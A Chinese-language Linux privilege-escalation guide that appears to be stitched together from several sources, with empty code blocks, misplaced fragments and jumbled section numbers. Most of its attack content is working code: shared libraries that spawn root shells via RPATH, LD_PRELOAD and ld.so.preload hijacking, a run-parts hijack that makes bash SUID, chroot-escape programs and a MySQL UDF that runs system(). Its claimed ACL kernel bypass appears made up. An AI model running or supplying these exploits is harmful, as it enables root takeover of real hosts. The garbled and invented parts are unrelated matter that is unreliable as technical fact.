### 1.3 Linux Capabilities利用

#### 1.3.1 Capabilities基础知识

**核心概念：**

传统的UNIX系统将进程分为两类：**权限变更**（UID=0的root进程）和**无权限变更**（UID!=0的非root进程）。权限的概念是二元的。

**Linux capabilities**是内核的一个特性，它允许对进程的"root能力"进行细分。每个执行的操作都与一个capability相关联，只有具有该capability的进程才能执行该操作。

**Capabilities集合：**

| 集合名称 | 功能描述 |
|---------|---------|
| **Permitted capability set** | 限制有效和可继承capabilities的集合 |
| **Effective capability set** | 内核用于执行权限检查的capabilities |
| **Inheritable capability set** | 在execve期间跨exec边界传递的capabilities |
| **Bounding capability set** | 限制可添加到可继承集中的capabilities |
| **Ambient capability set** | 对permitted和effective capabilities有贡献，在execve期间保持不变 |

**默认Docker容器capabilities：**

```
CHOWN, DAC_OVERRIDE, FSETID, FOWNER, MKNOD, NET_RAW, SETGID, SETUID, 
SETFCAP, SETPCAP, NET_BIND_SERVICE, SYS_CHROOT, KILL, AUDIT_WRITE
```

**Capabilities检测与管理：**

```bash
# 获取所有二进制文件的capabilities
getcap -r / 2>/dev/null

# 管理二进制文件的capabilities
setcap -r / 2>/dev/null
setcap cap_net_bind_service,cap_net_admin,cap_net_raw+eip /usr/bin/evil_bin

# 查看进程capabilities（十六进制转换）
cat /proc/PID/status | grep Cap
# 使用在线工具转换：https://tools.sysdream.com/capability-converter/
```

##### 1.3.2.4 CAP_SETUID/CAP_SETGID（身份切换）

**CAP_SETUID：** 可以设置创建进程的有效用户ID。

```python
import os

```

**另一种方式：**

```python
import os
import prctl
# 将capability添加到effective集
prctl.cap_effective.setuid = True

os.system("/bin/bash")
```

**CAP_SETGID：** 可以设置创建进程的有效组ID。

```bash
# 查找每个组可写的文件
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
# 查找/etc中最大深度为1的每个组可写的文件
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
# 查找/etc中最大深度为1的每个组可读的文件
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

模拟shadow组获取shell：

##### 1.3.2.5 CAP_SETFCAP（Capabilities传递）

```python
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))

s.bind(("lo",0x0003))

        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]

        dst_port=tcp_header[0]
```

### 3.3 SUID与euid/ruid/suid机制

#### 3.3.1 用户标识变量

| 变量 | 名称 | 说明 |
|:---:|------|------|
| **ruid** | 真实用户ID | 表示启动进程的用户 |
| **euid** | 有效用户ID | 系统用来确定进程权限的用户身份。通常反映ruid，但在SetUID二进制文件执行时承担文件所有者身份 |
| **suid** | 保存的用户ID | 高权限进程临时放弃权限后恢复初始提升状态的关键 |

**重要说明：** 不以root运行的进程只能将`euid`修改为当前`ruid`、`euid`或`suid`的值。

#### 3.3.2 setuid/setreuid/setresuid函数行为

| 函数 | 功能 | 说明 |
|-----|------|------|
| **setuid** | 修改euid | 对于特权进程，将ruid、euid和suid与指定用户对齐，固化这些ID |
| **setreuid** | 调整ruid和euid | 允许对ruid和euid进行细微调整 |
| **setresuid** | 调整ruid、euid、suid | 允许对三个ID进行细微调整 |

**限制：** 对于非root进程，修改仅限于当前的ruid、euid和suid值。root进程或具有`CAP_SETUID`能力的进程可以为这些ID分配任意值。

#### 3.3.3 execve与system调用差异

**execve系统调用：**
- 功能：启动由第一个参数决定的程序，接受argv和envp两个数组参数
- 行为：保留调用者的内存空间，刷新栈、堆和数据段，代码被新程序替换
- 用户ID保留：ruid、euid和补充组ID保持不变；如果新程序设置了SetUID位，euid可能变化；执行后suid从euid更新

**system函数：**
- 功能：使用fork创建子进程，在子进程中使用execl执行命令
- 命令执行：通过`sh`执行命令，使用`execl("/bin/sh", "sh", "-c", command, (char *) NULL);`
- 行为：由于execl是execve的一种形式，以类似方式运行，但在新子进程的上下文中

#### 3.3.4 bash/sh在SUID下的行为差异

**bash：**
- `-p`选项影响euid和ruid的处理方式
- **不带`-p`时：** bash在euid和ruid最初不同时将euid设置为ruid
- **带`-p`时：** 保留初始的euid

**sh：**
- 不具备类似bash中`-p`的机制
- 用户ID行为没有明确说明，除了在`-i`选项下强调保持euid和ruid相等

#### 3.3.5 测试执行中的用户ID行为

**情况1：使用setuid和system**

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    system("id");
    return 0;
}
```

结果：`uid=99(nobody) gid=99(nobody)` —— setuid将ruid和euid都对齐到1000，但system调用bash（sh到bash的符号链接），bash不带`-p`将euid调整为匹配ruid（99）。

**情况2：使用setreuid和system**

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setreuid(1000, 1000);
    system("id");
    return 0;
}
```

结果：`uid=1000(frank) gid=99(nobody)` —— setreuid将ruid和euid都设置为1000，bash保持这些ID。

**情况3：使用setuid和execve**

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/usr/bin/id", NULL, NULL);
    return 0;
}
```

结果：`uid=99(nobody) gid=99(nobody) euid=1000(frank)` —— ruid保持99，euid被设置为1000。

**情况4：使用setuid和execve调用bash**

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/bin/bash", NULL, NULL);
    return 0;
}
```

结果：`uid=99(nobody)` —— bash将euid重置为ruid（99）。

**情况5：使用setuid和bash -p**

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    setuid(1000);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

结果：`uid=99(nobody) gid=99(nobody) euid=1000` —— `-p`保留euid。

## 三、动态链接库劫持

### 4.1 RPATH劫持

**RPATH（Run-time search path）** 是二进制文件中指定的运行时库搜索路径，优先级高于系统默认路径。

**检测方法：**

```bash
readelf -d <二进制文件> | grep "NEEDED\|RPATH"
```

**示例分析：**

```shell
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```

**利用步骤：**

1. **确认RPATH指向的路径可控**
2. **将目标库复制到RPATH指定目录**

```shell
cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
```

3. **验证库加载路径变化**

```shell
level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)  # 路径已改变
/lib/ld-linux.so.2 (0x00737000)
```

4. **创建恶意库文件**

```shell

```

**恶意库代码示例：**


### 4.2 RUNPATH动态链接库替换

**RUNPATH** 是较新的动态链接器搜索路径机制，与RPATH存在优先级差异。

**RPATH、RUNPATH、LD_LIBRARY_PATH三者优先级关系：**

| 优先级 | 路径类型 | 说明 |
|:---:|---------|------|
| 1 | RPATH | 最高优先级 |
| 2 | LD_LIBRARY_PATH | 环境变量指定 |
| 3 | RUNPATH | 最低优先级 |

**关键差异：**

- 当**RUNPATH存在时，RPATH失效**
- RUNPATH**不适用于间接依赖的库**
- 使用RUNPATH可能需要配合使用 **LD_LIBRARY_PATH** 来指定依赖库文件的路径

**检测方法：**

使用系统自带的 `checksec` 命令（Kali 默认已安装）检测二进制文件的编译选项，重点关注RPATH和RUNPATH字段。
```bash
checksec --file=/path/to/binary
# 或使用 readelf 直接检查
readelf -d /path/to/binary 2>/dev/null | grep -E 'RPATH|RUNPATH'
```

**利用方法：**

```c
// gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

**编译命令：**

```bash
gcc -fPIC -shared -o /development/libshared.so src.c
```

### 4.3 SUID二进制SO注入

**检测方法：**

当遇到带有SUID权限的文件时，查看是否加载外部可控路径的SO文件。

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

**漏洞特征：**

遇到类似以下错误表明存在潜在利用可能：

```bash
open("/path/to/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

**利用步骤：**

1. **创建恶意共享库**

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

2. **编译恶意库**

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

3. **触发SUID程序执行**

运行目标SUID程序，动态链接器会加载恶意库，执行注入代码。

### 4.4 LD_PRELOAD全局注入

**`/etc/ld.so.preload`** 文件的行为类似于 **LD_PRELOAD** 环境变量，但关键区别在于它在 **SUID二进制文件** 中也同样有效。

**利用步骤：**

1. **写入预加载库路径**

```bash
echo "/tmp/pe.so" > /etc/ld.so.preload
```

2. **创建恶意预加载库**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");  // 清理痕迹
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

3. **编译**

```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

**注意事项：**

- 需要具备写入 `/etc/ld.so.preload` 的权限
- 该文件影响系统中**所有**动态链接的程序
- 利用后应及时清理，避免系统不稳定

### 6.2 Shadow组

### 6.3 Staff组

**权限特征：**

Staff组允许用户向系统添加本地修改（`/usr/local`）而无需root权限。

**关键风险点：**

在Debian发行版中，`$PATH` 变量显示 `/usr/local/` 以最高优先级运行：

```bash
# 普通用户
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# root用户
# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**利用方法：劫持run-parts程序**

1. **确认run-parts调用：**

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

2. **SSH登录时也会触发run-parts：**

```bash
$ pspy64
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
```

3. **攻击实施：**

```bash
# 0x1 在 /usr/local/bin/ 中添加run-parts脚本
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 添加执行权限
$ chmod +x /usr/local/bin/run-parts

# 0x3 启动新的ssh会话以触发run-parts程序

# 0x4 检查 u+s 权限
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 获取root
$ /bin/bash -p
```

## 六、文件系统与配置缺陷提权

### 7.1 任意文件写入获取Root

#### 7.1.1 /etc/ld.so.preload全局注入

**原理：** 此文件的行为类似于 **LD_PRELOAD** 环境变量，但关键区别在于它在 **SUID二进制文件** 中也同样有效。

**利用步骤：**

1. **写入预加载库路径：**
```bash

```

2. **创建恶意预加载库：**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");  // 清理痕迹
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

3. **编译：**
```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

#### 7.1.2 Git钩子滥用

**原理：** Git钩子是在git仓库中的各种事件（如创建提交、合并等）时运行的脚本。如果特权脚本或用户频繁执行这些操作，且可以在 `.git` 文件夹中写入，可用于提权。

**利用方法：**


**攻击实施：**

## 九、受限环境逃逸

### 10.1 Chroot逃逸

**原理：** Chroot机制**并非旨在防御**具有**特权**（**root**）**用户**的故意篡改。具有足够权限的chroot程序**可以执行第二次chroot来逃逸**。

#### 10.1.1 Root + CWD双重chroot

**原理：** 两个chroot不能共存（在Linux中），创建新文件夹并在其上创建新chroot，而你在它外面，就会在新chroot之外。

**C语言版本：**

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

// gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```

**Python版本：**

```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```

**Perl版本：**

```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```

#### 10.1.2 Root + 保存的文件描述符

**原理：** 攻击者保存指向当前目录的文件描述符，在新文件夹中创建chroot，然后通过该文件描述符访问chroot外部。

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

// gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("tmpdir", 0755);
    dir_fd = open(".", O_RDONLY);
    if(chroot("tmpdir")){
        perror("chroot");
    }
    fchdir(dir_fd);
    close(dir_fd);
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
}
```

#### 10.1.3 Root + Fork + UDS

**原理：** 文件描述符可以通过Unix域套接字传递。

- 创建子进程（fork）
- 创建UDS以便父子进程通信
- 在子进程中在不同文件夹运行chroot
- 在父进程中创建指向新子进程chroot之外的文件夹的文件描述符
- 使用UDS将该文件描述符传递给子进程
- 子进程chdir到该文件描述符，逃出监牢

#### 10.1.4 Root + Mount

**原理：** 将根设备（/）挂载到chroot内部的目录中，然后chroot到该目录。

#### 10.1.5 Root + /proc

**原理：** 将procfs挂载到chroot内部的目录中，查找具有不同root/cwd条目的pid，如 `/proc/1/root`，然后chroot到该条目。

#### 10.1.6 Root + Fork目录移动

**原理：** 创建Fork并在文件系统中更深层的文件夹chroot并CD到其中，从父进程将子进程所在的文件夹移动到子进程chroot之前的文件夹。

#### 10.1.7 ptrace注入

**原理：** 以前用户可以从进程本身调试自己的进程，但默认情况下这已不再可能。如果可能，可以ptrace进入一个进程并在其中执行shellcode。

## 十、SELinux安全机制绕过

### 11.1 SELinux快速枚举

**SELinux基础概念：**

SELinux是一个**基于标签的强制访问控制（MAC）**系统。即使DAC权限、组或Linux功能看起来足以执行某个操作，内核仍然可以拒绝它，因为**源上下文**不被允许以请求的类/权限访问**目标上下文**。

**上下文格式：** `user:role:type:level`

示例：
- `system_u:system_r:httpd_t:s0`
- `unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023`

**快速枚举命令：**

```bash
# SELinux状态
getenforce
sestatus

# 当前进程上下文
id -Z
ps -eZ | head
cat /proc/self/attr/current

# 文件标签
ls -Zd / /root /home /tmp /etc /var/www 2>/dev/null

# 已安装的策略模块和本地自定义
semodule -lfull 2>/dev/null
semanage fcontext -C -l 2>/dev/null
semanage permissive -l 2>/dev/null
semanage login -l 2>/dev/null
semanage user -l 2>/dev/null

# 查找异常标签
find / -context '*:default_t:*' -o -context '*:file_t:*' 2>/dev/null

# 比较路径的当前标签与策略默认值
matchpathcon -V /path/of/interest 2>/dev/null
restorecon -n -v /path/of/interest 2>/dev/null
```

**有趣的发现：**

| 发现 | 含义 |
|-----|------|
| `Disabled` 或 `Permissive` 模式 | 消除SELinux作为边界的大部分价值 |
| `unconfined_t` | SELinux存在但没有对该进程进行有意义的约束 |
| `default_t`、`file_t` 或明显错误的标签 | 标签错误或部署不完整 |
| `file_contexts.local` 中的本地覆盖 | 优先于策略默认值 |

## 十一、ACL权限漏洞挖掘

### 12.1 ACL技术原理

**ACL在Linux权限模型中的定位：**

Linux传统权限模型基于UGO（User-Group-Other）三元组，ACL在此基础上扩展了权限控制粒度。

**权限检查顺序：**
```
进程有效UID → 文件所有者匹配 → 进程有效/辅助GID匹配 → 
命名用户ACL → 命名组ACL → other权限
```

**关键数据结构：**

```c
struct posix_acl_entry {
    unsigned short  e_tag;   // ACL_USER, ACL_GROUP, ACL_OTHER
    unsigned short  e_perm;  // ACL_READ, ACL_WRITE, ACL_EXECUTE
    unsigned int    e_id;    // UID或GID
};
```

**高危实现缺陷：**

在 `acl_permission_check()` 函数中存在关键逻辑分支：

```c
static int acl_permission_check(...) {
    if (in_group_p(inode->i_gid)) {
        // 【漏洞点】当group权限位为0时，ACL检查被绕过
        if (mode & (S_IRWXG >> 3) == 0) {
            return (other_perm & mask) ? 0 : -EACCES;
        }
        if (IS_POSIXACL(inode) && (mode & S_IRWXG)) {
            return check_acl(inode, mask);
        }
    }
}
```

**核心漏洞：** 当文件group权限位为`---`时，ACL规则失效，权限决策回退到other权限。

### 12.2 Group=000绕过测试

**漏洞原理：** 当文件的group权限位为空时，内核 `acl_permission_check()` 函数会跳过ACL检查，直接使用other权限位决定访问权限。

**完整测试流程：**

**步骤1：环境准备**

### 12.3 SUID与ACL组合攻击

**漏洞原理：** SUID程序以文件所有者权限运行，若通过ACL授予了非所有者对该SUID文件的写权限，攻击者可修改程序逻辑实现权限提升。

**完整攻击链：**

**步骤1：识别目标**
```bash
# 寻找带有扩展ACL的SUID文件
find / -type f -perm /4000 -exec bash -c \
    'getfacl -n "$1" 2>/dev/null | grep -q "^user:" && echo "$1"' _ {} \; 2>/dev/null
```

**步骤2：构造攻击场景**
```bash
# 假设攻击者已获得对passwd的ACL写权限
setfacl -m u:attacker:rwx /usr/bin/passwd

# 验证权限
getfacl /usr/bin/passwd | grep attacker
# user:attacker:rwx
```

**步骤3：编写恶意载荷**
```c
// exploit.c - 共享库注入攻击
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    // 由于SUID程序以root运行，此代码将以root执行
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
    // 清理痕迹
    unsetenv("LD_PRELOAD");
}
```

**步骤4：编译与利用**
```bash
# 编译恶意共享库
gcc -shared -fPIC -o /tmp/libexploit.so exploit.c

# 利用LD_PRELOAD加载恶意库（需要SUID程序调用外部库）
LD_PRELOAD=/tmp/libexploit.so /usr/bin/passwd

# 获取root shell
/tmp/rootbash -p
# 输出：root@host:/tmp# ← 提权成功！
```

**防御检测**
```bash

# 查看LD_PRELOAD环境变量
cat /proc/*/environ | tr '\0' '\n' | grep LD_PRELOAD
```

### 12.4 默认ACL投毒

**漏洞原理：** 目录上的默认ACL（Default ACL）会影响该目录下所有新创建的文件。攻击者若能在系统关键目录设置恶意默认ACL，后续系统服务创建的新文件将自动继承攻击者的访问权限。

**完整利用流程：**

**步骤1：定位可写敏感目录**
```bash

```

**步骤2：植入恶意默认ACL**
```bash

# 查看默认ACL

# default:user:attacker:rwx  ← 已植入
```

**步骤3：等待触发**
```bash

# 或管理员使用crontab -e编辑
# 新创建的cron文件自动继承ACL

inotifywait -m /var/spool/cron/crontabs -e create |
while read dir action file; do
    echo "New file created: $event"
    getfacl $(echo $event | awk '{print $3}')
done
```

**步骤4：权限获取**
```bash
# 当root执行crontab -e时
# 新文件/var/spool/cron/crontabs/root自动包含ACL

# user:attacker:rwx  ← 攻击者可读root的cron任务

# 攻击者读取敏感信息
```

**清理痕迹**

### 12.5 容器UID映射绕过

**漏洞原理：** 容器内外UID命名空间隔离但未完全映射，宿主机ACL依赖数字UID进行权限判断。攻击者可通过调整容器运行参数，使容器内UID与宿主机ACL允许的UID匹配，从而越权访问宿主机文件。

**完整利用演示：**

**步骤1：构建漏洞环境**
```bash
# Dockerfile - 创建测试镜像
cat > Dockerfile <<EOF
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y acl
RUN useradd -m -u 1000 hostuser
RUN echo "HOST SECRET" > /home/hostuser/secret.txt
RUN chmod 600 /home/hostuser/secret.txt && \
    setfacl -m u:hostuser:rw- /home/hostuser/secret.txt
EOF

docker build -t acl-vuln .
```

**步骤2：信息收集**
```bash
# 在宿主机查看ACL配置
getfacl /home/hostuser/secret.txt
# user:hostuser:rw-  ← UID 1000拥有读写权限
# other::---          ← 其他用户无权限
```

**步骤3：容器逃逸攻击**
```bash
# 攻击者启动容器，指定UID为1000（与hostuser匹配）
docker run --rm -v /home/hostuser:/mnt -u 1000 acl-vuln bash

# 在容器内访问宿主机文件
cat /mnt/secret.txt
# 输出：HOST SECRET ← 成功逃逸！

# 尝试写入
echo "COMPROMISED" > /mnt/secret.txt
cat /mnt/secret.txt
# 输出：COMPROMISED ← 成功修改
```

**步骤4：扩展攻击**
```bash
# 枚举容器内所有可用的UID
for uid in {1000..1010}; do
    docker run --rm -v /etc/shadow:/shadow -u $uid ubuntu:22.04 \
        bash -c "cat /shadow 2>/dev/null && echo 'UID $uid works!' || true"
done
# 若输出"UID 1000 works!"，则ACL配置存在风险
```

**加固方案**
```bash

# 或使用SELinux上下文限制容器访问
chcon -t container_file_t /home/hostuser/secret.txt
```

### 12.6 NFS共享ACL映射攻击

**漏洞原理：** NFSv3不支持ACL，客户端ACL请求在服务器端转换为传统权限位。若NFS导出配置不当（如`no_root_squash`），客户端可通过ACL操作获得服务器上不存在的UID/GID权限，导致文件归属混乱和越权访问。

**完整攻击流程：**

**步骤1：服务器配置漏洞场景**
```bash

cat /etc/exports
/export *(rw,no_root_squash,insecure)
# no_root_squash是关键漏洞点
```

**步骤2：客户端挂载与信息收集**
```bash
# 客户端挂载NFS共享
mount -t nfs server:/export /mnt/nfs

# 查看NFS共享文件权限
ls -la /mnt/nfs/
# 显示所有文件属主为nobody:nogroup（无映射）

# 尝试创建ACL（NFSv4需要特殊参数）
nfs4_getfacl /mnt/nfs/
# 若输出包含NFSv4 ACL格式，则支持扩展
```

**步骤3：利用UID映射漏洞**
```bash
# 在客户端创建带有特定UID的ACL
nfs4_setfacl -a A:1001:rwx /mnt/nfs/testfile

# 在服务器端检查
ssh server "getfacl /export/testfile"
# 输出显示UID 1001而非用户名 ← 孤立UID

# 创建UID 1001用户接管文件
useradd -u 1001 nfsattacker
# 现在该用户可以访问原文件
```

**步骤4：权限提升**
```bash

server# setfacl -m u:1002:rwx /usr/bin/suid_prog
server# chmod +s /usr/bin/suid_prog

# 客户端创建UID 1002用户
client# useradd -u 1002 attacker
client# /usr/bin/suid_prog  # 现在以root运行
```

**检测与修复**
```bash
# 服务器检查NFS导出选项
exportfs -v
# 查找no_root_squash，改为root_squash

# 启用NFSv4 ACL支持
mount -t nfs4 -o acl server:/export /mnt/nfs
```

**参考文章：** https://blog.hrncirik.net/cve-2023-46214-analysis

**利用场景：**

如果在内部或外部枚举机器时发现 **Splunk 正在运行**（端口8090），且知道任何**有效凭据**，就可以**滥用Splunk服务**来以运行Splunk的用户身份**执行shell**。如果root正在运行它，可以提权到root。

**持久化利用：**

如果**已经是root且Splunk服务不仅在localhost上监听**，可以：
- 从Splunk服务中**窃取**密码文件并**破解**密码
- **向其中添加新的**凭据
- 在主机上维持持久化

```c
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
    unsigned int arg_count;
    enum Item_result *arg_type;
    char **args;
    unsigned long *lengths;
    char *maybe_null;
} UDF_ARGS;

typedef struct st_udf_init {
    char maybe_null;
    unsigned int decimals;
    unsigned long max_length;
    char *ptr;
    char const_item;
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->arg_count != 1) return 0;
    system(args->args[0]);
    return 0;
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    return 0;
}
```

```bash
gcc -shared -fPIC -o udf.so udf.c
```

### 15.2 系统可执行文件审计

**审计范围：**

```bash
# 查找系统可执行文件

# 同样关注以下目录
/bin
/sbin
/usr/bin
/usr/sbin
/usr/local/bin
/usr/local/sbin
```

**审计重点：**

| 属性 | 风险说明 |
|-----|---------|
| 属主为netadmin/setadmin/secadmin | 可能具有特殊网络/安全权限 |
| 带有SUID/SGID位 | 可能用于权限提升 |
| 带有Capabilities | 可能绕过权限检查 |
| 可被普通用户写入 | 可被篡改植入后门 |
| 存在隐藏参数 | 可能包含未公开功能 |

**批量审计方法：**

```bash
# 查找高权限应用
find /bin /sbin /usr/bin /usr/sbin -type f \( \
    -user root -o -user netadmin -o -user secadmin -o -user sysadmin \
\) -exec ls -la {} \; 2>/dev/null

# 查找带有Capabilities的应用
getcap -r /bin /sbin /usr/bin /usr/sbin 2>/dev/null

# 查找可写的高权限应用
find /bin /sbin /usr/bin /usr/sbin -type f -perm /o+w -exec ls -la {} \; 2>/dev/null
```
